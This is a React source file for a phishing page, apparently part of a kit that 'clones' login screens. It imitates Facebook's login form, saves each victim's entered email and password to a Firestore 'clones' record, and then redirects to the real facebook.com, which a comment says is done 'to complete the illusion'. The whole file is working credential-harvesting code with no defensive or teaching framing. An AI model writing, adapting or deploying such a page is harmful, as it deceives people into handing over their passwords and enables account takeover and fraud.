"use client";
import { useState } from "react";
import { db } from "@/lib/firebase";
import { doc, updateDoc, getDoc } from "firebase/firestore";
import type { Clone } from "@/lib/types";

export default function FacebookPage({ clone }: { clone: Clone }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email) {
      const newCredential = {
        id: `cred-${Math.random().toString(36).substr(2, 9)}`,
        username: email,
        password,
        createdAt: new Date().toISOString(),
      };

      const cloneRef = doc(db, "clones", clone.id);
      const cloneSnap = await getDoc(cloneRef);
      if (cloneSnap.exists()) {
        const currentCredentials = cloneSnap.data().credentials || [];
        await updateDoc(cloneRef, {
          credentials: [newCredential, ...currentCredentials],
        });
      }
    }
    // Redirect to the actual facebook page to complete the illusion
    window.location.href = "https://www.facebook.com";
  };

  return (
    <div className="bg-[#f0f2f5] min-h-screen flex items-center justify-center p-4 lg:p-0">
      <div className="flex flex-col lg:flex-row items-center justify-center w-full max-w-5xl">
        <div className="lg:w-1/2 lg:pr-12 mb-8 lg:mb-0 text-center lg:text-left">
          <h1 className="text-6xl font-bold text-[#1877f2] -m-4">facebook</h1>
          <p className="text-2xl mt-4 text-gray-800">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>
        <div className="lg:w-1/2 w-full max-w-md">
          <div className="bg-white p-6 rounded-lg shadow-lg w-full">
            <form onSubmit={handleSubmit} className="space-y-4">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email address or phone number"
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg"
                required
              />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg"
              />
              <button
                type="submit"
                className="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold text-xl hover:bg-[#166fe5] transition-colors"
              >
                Log In
              </button>
              <div className="text-center">
                <a href="#" className="text-sm text-[#1877f2] hover:underline">
                  Forgotten password?
                </a>
              </div>
              <hr className="border-gray-300" />
              <div className="text-center">
                <button
                  type="button"
                  className="bg-[#42b72a] text-white px-4 py-3 rounded-md font-bold hover:bg-[#36a420] transition-colors text-lg"
                >
                  Create new account
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
